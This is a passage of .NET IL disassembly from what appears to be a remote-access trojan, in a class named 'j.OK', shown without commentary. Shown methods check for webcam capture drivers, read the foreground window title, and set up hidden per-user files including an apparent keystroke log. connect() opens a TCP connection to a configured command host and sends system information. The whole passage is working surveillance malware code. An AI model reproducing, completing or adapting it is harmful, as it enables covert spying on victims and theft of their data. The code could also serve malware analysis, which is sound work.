                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_00b6:  ldnull
    IL_00b7:  ldstr      "EnglishName"
    IL_00bc:  ldc.i4.0
    IL_00bd:  newarr     [mscorlib]System.Object
    IL_00c2:  ldnull
    IL_00c3:  ldnull
    IL_00c4:  ldnull
    IL_00c5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_00ca:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_00cf:  stfld      string j.OK::culture
    IL_00d4:  ldarg.0
    IL_00d5:  ldarg.0
    IL_00d6:  ldfld      string j.OK::culture
    IL_00db:  ldarg.0
    IL_00dc:  ldfld      string j.OK::culture
    IL_00e1:  ldc.i4.s   40
    IL_00e3:  callvirt   instance int32 [mscorlib]System.String::IndexOf(char)
    IL_00e8:  ldc.i4.1
    IL_00e9:  add.ovf
    IL_00ea:  ldarg.0
    IL_00eb:  ldfld      string j.OK::culture
    IL_00f0:  ldc.i4.s   41
    IL_00f2:  callvirt   instance int32 [mscorlib]System.String::LastIndexOf(char)
    IL_00f7:  ldarg.0
    IL_00f8:  ldfld      string j.OK::culture
    IL_00fd:  ldc.i4.s   40
    IL_00ff:  callvirt   instance int32 [mscorlib]System.String::IndexOf(char)
    IL_0104:  sub.ovf
    IL_0105:  ldc.i4.1
    IL_0106:  sub.ovf
    IL_0107:  callvirt   instance string [mscorlib]System.String::Substring(int32,
                                                                            int32)
    IL_010c:  stfld      string j.OK::country
    IL_0111:  ldarg.0
    IL_0112:  ldstr      "Shell_traywnd"
    IL_0117:  stloc.0
    IL_0118:  ldloca.s   V_0
    IL_011a:  ldstr      ""
    IL_011f:  stloc.1
    IL_0120:  ldloca.s   V_1
    IL_0122:  call       int32 j.OK::FindWindow(string&,
                                                string&)
    IL_0127:  stfld      int32 j.OK::taskBar_
    IL_012c:  ldarg.0
    IL_012d:  ldc.i4.0
    IL_012e:  stfld      int32 j.OK::tictoc
    IL_0133:  ldarg.0
    IL_0134:  ldc.i4.0
    IL_0135:  stfld      bool j.OK::streamWebcam
    IL_013a:  ldarg.0
    IL_013b:  ldstr      "76487-337-8429955-22614"
    IL_0140:  stfld      string j.OK::id
    IL_0145:  ldarg.0
    IL_0146:  ldc.i4.s   21
    IL_0148:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
    IL_014d:  ldstr      "\\"
    IL_0152:  call       string [mscorlib]System.Environment::get_UserName()
    IL_0157:  ldstr      ".wav"
    IL_015c:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0161:  stfld      string j.OK::screamx
    IL_0166:  ldarg.0
    IL_0167:  ldc.i4.s   21
    IL_0169:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
    IL_016e:  ldstr      "\\"
    IL_0173:  call       string [mscorlib]System.Environment::get_UserName()
    IL_0178:  ldstr      ".ini"
    IL_017d:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0182:  stfld      string j.OK::scream
    IL_0187:  ldarg.0
    IL_0188:  ldc.i4.s   21
    IL_018a:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
    IL_018f:  ldstr      "\\"
    IL_0194:  call       string [mscorlib]System.Environment::get_UserName()
    IL_0199:  ldstr      ".E"
    IL_019e:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_01a3:  stfld      string j.OK::hid
    IL_01a8:  ldarg.0
    IL_01a9:  ldc.i4.0
    IL_01aa:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
    IL_01af:  stfld      string j.OK::S762
    IL_01b4:  ldarg.0
    IL_01b5:  ldc.i4.s   21
    IL_01b7:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
    IL_01bc:  ldstr      "\\"
    IL_01c1:  call       string [mscorlib]System.Environment::get_UserName()
    IL_01c6:  ldstr      ".jpg"
    IL_01cb:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_01d0:  stfld      string j.OK::ooo
    IL_01d5:  ldarg.0
    IL_01d6:  ldc.i4.s   21
    IL_01d8:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
    IL_01dd:  ldstr      "\\"
    IL_01e2:  call       string [mscorlib]System.Environment::get_UserName()
    IL_01e7:  ldstr      ".log"
    IL_01ec:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_01f1:  stfld      string j.OK::LogsPathsoo
    IL_01f6:  nop
    IL_01f7:  ret
  } // end of method OK::.ctor

  .method public specialname instance int32 
          get_IWin32Window(string p1,
                           string p2) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  1
    .locals init (int32 V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      int32 j.OK::_iWin32Window
    IL_0007:  stloc.0
    IL_0008:  br.s       IL_000a

    IL_000a:  ldloc.0
    IL_000b:  ret
  } // end of method OK::get_IWin32Window

  .method public specialname instance void 
          set_IWin32Window(string p1,
                           string p2,
                           int32 'value') cil managed
  {
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldarg.3
    IL_0003:  stfld      int32 j.OK::_iWin32Window
    IL_0008:  nop
    IL_0009:  ret
  } // end of method OK::set_IWin32Window

  .method private specialname static object 
          get_NomeSpreadDiscoLocal() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       10 (0xa)
    .maxstack  1
    .locals init (object V_0)
    IL_0000:  ldsfld     object j.OK::_NomeSpreadDiscoLocal
    IL_0005:  stloc.0
    IL_0006:  br.s       IL_0008

    IL_0008:  ldloc.0
    IL_0009:  ret
  } // end of method OK::get_NomeSpreadDiscoLocal

  .method private specialname static void 
          set_NomeSpreadDiscoLocal(object AutoPropertyValue) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0006:  stsfld     object j.OK::_NomeSpreadDiscoLocal
    IL_000b:  nop
    IL_000c:  ret
  } // end of method OK::set_NomeSpreadDiscoLocal

  .method public specialname instance object 
          get_CultureInfo_() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (object V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      object j.OK::_CultureInfo_
    IL_0006:  stloc.0
    IL_0007:  br.s       IL_0009

    IL_0009:  ldloc.0
    IL_000a:  ret
  } // end of method OK::get_CultureInfo_

  .method public specialname instance void 
          set_CultureInfo_(object AutoPropertyValue) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0007:  stfld      object j.OK::_CultureInfo_
    IL_000c:  nop
    IL_000d:  ret
  } // end of method OK::set_CultureInfo_

  .method private static void  _Lambda__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  castclass  uint8[]
    IL_0007:  call       void j.OK::Ind(uint8[])
    IL_000c:  nop
    IL_000d:  nop
    IL_000e:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void j.OK::ED()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method OK::_Lambda__2

  .method public static string  ACT() cil managed
  {
    // Code size       125 (0x7d)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             bool V_6)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       native int j.OK::GetForegroundWindow()
      IL_0007:  stloc.2
      IL_0008:  ldloc.2
      IL_0009:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000e:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0013:  stloc.s    V_6
      IL_0015:  ldloc.s    V_6
      IL_0017:  brfalse.s  IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_007b

      IL_0021:  nop
      IL_0022:  ldloc.2
      IL_0023:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0028:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_002d:  ldc.i4.1
      IL_002e:  add.ovf
      IL_002f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_0034:  stloc.3
      IL_0035:  ldloc.2
      IL_0036:  ldloca.s   V_3
      IL_0038:  ldloc.3
      IL_0039:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_003e:  call       int32 j.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_0043:  pop
      IL_0044:  ldloca.s   V_3
      IL_0046:  call       string j.OK::ENB(string&)
      IL_004b:  stloc.1
      IL_004c:  leave.s    IL_0076

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_004e:  dup
      IL_004f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0054:  stloc.s    V_5
      IL_0056:  nop
      IL_0057:  ldloc.s    V_5
      IL_0059:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_005e:  nop
      IL_005f:  ldloc.s    V_5
      IL_0061:  stloc.s    V_4
      IL_0063:  ldstr      ""
      IL_0068:  stloc.1
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006e:  nop
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  nop
    IL_0077:  ldloc.1
    IL_0078:  stloc.0
    IL_0079:  br.s       IL_007b

    IL_007b:  ldloc.0
    IL_007c:  ret
  } // end of method OK::ACT

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       101 (0x65)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             bool V_6)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.1
      IL_0004:  nop
      IL_0005:  ldnull
      IL_0006:  stloc.2
      IL_0007:  ldloc.1
      IL_0008:  conv.ovf.i2
      IL_0009:  ldc.i4.s   100
      IL_000b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_0010:  stloc.s    V_5
      IL_0012:  ldloca.s   V_5
      IL_0014:  ldc.i4.s   100
      IL_0016:  ldloca.s   V_2
      IL_0018:  ldc.i4.s   100
      IL_001a:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001f:  stloc.s    V_6
      IL_0021:  ldloc.s    V_6
      IL_0023:  brfalse.s  IL_0029

      IL_0025:  ldc.i4.1
      IL_0026:  stloc.0
      IL_0027:  leave.s    IL_0063

      IL_0029:  nop
      IL_002a:  ldloc.1
      IL_002b:  ldc.i4.1
      IL_002c:  add.ovf
      IL_002d:  stloc.1
      IL_002e:  ldloc.1
      IL_002f:  ldc.i4.4
      IL_0030:  cgt
      IL_0032:  ldc.i4.0
      IL_0033:  ceq
      IL_0035:  stloc.s    V_6
      IL_0037:  ldloc.s    V_6
      IL_0039:  brtrue.s   IL_0005

      IL_003b:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.s    V_4
      IL_0045:  nop
      IL_0046:  ldloc.s    V_4
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  nop
      IL_004e:  ldloc.s    V_4
      IL_0050:  stloc.3
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0056:  nop
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  nop
    IL_005f:  ldc.i4.0
    IL_0060:  stloc.0
    IL_0061:  br.s       IL_0063

    IL_0063:  ldloc.0
    IL_0064:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       157 (0x9d)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2,
             bool V_3)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0007:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000c:  ldarg.1
    IL_000d:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0012:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0017:  ldc.i4.0
    IL_0018:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001d:  ldc.i4.0
    IL_001e:  ceq
    IL_0020:  stloc.3
    IL_0021:  ldloc.3
    IL_0022:  brfalse.s  IL_0096

    IL_0024:  ldarg.0
    IL_0025:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002a:  stloc.1
    IL_002b:  ldarg.1
    IL_002c:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0031:  stloc.2
    IL_0032:  nop
    IL_0033:  ldloc.1
    IL_0034:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0039:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_003e:  ldloc.2
    IL_003f:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0044:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0049:  ldc.i4.0
    IL_004a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_004f:  ldc.i4.0
    IL_0050:  ceq
    IL_0052:  ldc.i4.0
    IL_0053:  ceq
    IL_0055:  stloc.3
    IL_0056:  ldloc.3
    IL_0057:  brfalse.s  IL_005d

    IL_0059:  ldc.i4.0
    IL_005a:  stloc.0
    IL_005b:  br.s       IL_009b

    IL_005d:  nop
    IL_005e:  ldloc.1
    IL_005f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0064:  stloc.1
    IL_0065:  ldloc.2
    IL_0066:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_006b:  stloc.2
    IL_006c:  ldloc.1
    IL_006d:  ldnull
    IL_006e:  ceq
    IL_0070:  ldloc.2
    IL_0071:  ldnull
    IL_0072:  ceq
    IL_0074:  and
    IL_0075:  stloc.3
    IL_0076:  ldloc.3
    IL_0077:  brfalse.s  IL_007d

    IL_0079:  ldc.i4.1
    IL_007a:  stloc.0
    IL_007b:  br.s       IL_009b

    IL_007d:  nop
    IL_007e:  ldloc.1
    IL_007f:  ldnull
    IL_0080:  ceq
    IL_0082:  stloc.3
    IL_0083:  ldloc.3
    IL_0084:  brfalse.s  IL_008a

    IL_0086:  ldc.i4.0
    IL_0087:  stloc.0
    IL_0088:  br.s       IL_009b

    IL_008a:  nop
    IL_008b:  ldloc.2
    IL_008c:  ldnull
    IL_008d:  ceq
    IL_008f:  ldc.i4.0
    IL_0090:  ceq
    IL_0092:  stloc.3
    IL_0093:  ldloc.3
    IL_0094:  brtrue.s   IL_0033

    IL_0096:  nop
    IL_0097:  ldc.i4.0
    IL_0098:  stloc.0
    IL_0099:  br.s       IL_009b

    IL_009b:  ldloc.0
    IL_009c:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed
  {
    // Code size       794 (0x31a)
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.IO.FileInfo V_13,
             string V_14,
             string[] V_15,
             string[] V_16,
             bool V_17)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  stsfld     bool j.OK::Cn
    IL_0007:  ldc.i4     0x7d0
    IL_000c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0011:  nop
    IL_0012:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0017:  stloc.1
    IL_0018:  nop
    IL_0019:  ldloc.1
    IL_001a:  stloc.s    V_13
    IL_001c:  ldloc.s    V_13
    IL_001e:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    IL_0023:  nop
    IL_0024:  nop
    .try
    {
      IL_0025:  nop
      .try
      {
        IL_0026:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_002b:  ldnull
        IL_002c:  ceq
        IL_002e:  ldc.i4.0
        IL_002f:  ceq
        IL_0031:  stloc.s    V_17
        IL_0033:  ldloc.s    V_17
        IL_0035:  brfalse.s  IL_006a

        IL_0037:  nop
        .try
        {
          IL_0038:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_003d:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_0042:  nop
          IL_0043:  ldnull
          IL_0044:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0049:  leave.s    IL_0069

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_004b:  dup
          IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0051:  stloc.3
          IL_0052:  nop
          IL_0053:  ldloc.3
          IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0059:  nop
          IL_005a:  ldloc.3
          IL_005b:  stloc.2
          IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0061:  nop
          IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0067:  leave.s    IL_0069

        }  // end handler
        IL_0069:  nop
        IL_006a:  nop
        IL_006b:  nop
        .try
        {
          IL_006c:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_0071:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_0076:  nop
          IL_0077:  leave.s    IL_009b

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0079:  dup
          IL_007a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_007f:  stloc.s    V_5
          IL_0081:  nop
          IL_0082:  ldloc.s    V_5
          IL_0084:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0089:  nop
          IL_008a:  ldloc.s    V_5
          IL_008c:  stloc.s    V_4
          IL_008e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0093:  nop
          IL_0094:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0099:  leave.s    IL_009b

        }  // end handler
        IL_009b:  nop
        IL_009c:  leave.s    IL_00c0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_009e:  dup
        IL_009f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00a4:  stloc.s    V_7
        IL_00a6:  nop
        IL_00a7:  ldloc.s    V_7
        IL_00a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ae:  nop
        IL_00af:  ldloc.s    V_7
        IL_00b1:  stloc.s    V_6
        IL_00b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00b8:  nop
        IL_00b9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00be:  leave.s    IL_00c0

      }  // end handler
      IL_00c0:  nop
      IL_00c1:  nop
      .try
      {
        IL_00c2:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_00c7:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_00cc:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_00d1:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00d6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00db:  ldc.i4     0x32000
        IL_00e0:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_00e5:  nop
        IL_00e6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00eb:  ldc.i4     0x32000
        IL_00f0:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_00f5:  nop
        IL_00f6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00fb:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0100:  ldc.i4     0x2710
        IL_0105:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_010a:  nop
        IL_010b:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0110:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0115:  ldc.i4     0x2710
        IL_011a:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_011f:  nop
        IL_0120:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0125:  ldsfld     string j.OK::H
        IL_012a:  ldsfld     string j.OK::P
        IL_012f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0134:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_0139:  nop
        IL_013a:  ldc.i4.1
        IL_013b:  stsfld     bool j.OK::Cn
        IL_0140:  call       string j.OK::inf()
        IL_0145:  call       bool j.OK::Send(string)
        IL_014a:  pop
        IL_014b:  nop
        .try
        {
          IL_014c:  ldstr      "vn"
          IL_0151:  ldstr      ""
          IL_0156:  call       object j.OK::GTV(string,
                                                object)
          IL_015b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0160:  ldstr      ""
          IL_0165:  ldc.i4.0
          IL_0166:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_016b:  stloc.s    V_17
          IL_016d:  ldloc.s    V_17
          IL_016f:  brfalse.s  IL_018b

          IL_0171:  ldloc.s    V_8
          IL_0173:  ldsflda    string j.OK::VN
          IL_0178:  call       string j.OK::DEB(string&)
          IL_017d:  ldstr      "\r\n"
          IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0187:  stloc.s    V_8
          IL_0189:  br.s       IL_01bc

          IL_018b:  nop
          IL_018c:  ldloc.s    V_8
          IL_018e:  ldstr      "vn"
          IL_0193:  ldstr      ""
          IL_0198:  call       object j.OK::GTV(string,
                                                object)
          IL_019d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_01a2:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_01a7:  stloc.s    V_14
          IL_01a9:  ldloca.s   V_14
          IL_01ab:  call       string j.OK::DEB(string&)
          IL_01b0:  ldstr      "\r\n"
          IL_01b5:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01ba:  stloc.s    V_8
          IL_01bc:  nop
          IL_01bd:  ldc.i4.s   12
          IL_01bf:  newarr     [mscorlib]System.String
          IL_01c4:  stloc.s    V_16
          IL_01c6:  ldloc.s    V_16
          IL_01c8:  ldc.i4.0
          IL_01c9:  ldc.i4.5
          IL_01ca:  newarr     [mscorlib]System.String
          IL_01cf:  stloc.s    V_15
          IL_01d1:  ldloc.s    V_15
          IL_01d3:  ldc.i4.0
          IL_01d4:  ldloc.s    V_8
          IL_01d6:  stelem.ref
          IL_01d7:  nop
          IL_01d8:  ldloc.s    V_15
          IL_01da:  ldc.i4.1
          IL_01db:  ldsfld     string j.OK::H
          IL_01e0:  stelem.ref
          IL_01e1:  nop
          IL_01e2:  ldloc.s    V_15
          IL_01e4:  ldc.i4.2
          IL_01e5:  ldstr      ":"
          IL_01ea:  stelem.ref
          IL_01eb:  nop
          IL_01ec:  ldloc.s    V_15
          IL_01ee:  ldc.i4.3
          IL_01ef:  ldsfld     string j.OK::P
          IL_01f4:  stelem.ref
          IL_01f5:  nop
          IL_01f6:  ldloc.s    V_15
          IL_01f8:  ldc.i4.4
          IL_01f9:  ldstr      "\r\n"
          IL_01fe:  stelem.ref
          IL_01ff:  nop
          IL_0200:  ldloc.s    V_15
          IL_0202:  call       string [mscorlib]System.String::Concat(string[])
          IL_0207:  stelem.ref
          IL_0208:  nop
          IL_0209:  ldloc.s    V_16
          IL_020b:  ldc.i4.1
          IL_020c:  ldsfld     string j.OK::DR
          IL_0211:  stelem.ref
          IL_0212:  nop
          IL_0213:  ldloc.s    V_16
          IL_0215:  ldc.i4.2
          IL_0216:  ldstr      "\r\n"
          IL_021b:  stelem.ref
          IL_021c:  nop
          IL_021d:  ldloc.s    V_16
          IL_021f:  ldc.i4.3
          IL_0220:  ldsfld     string j.OK::EXE
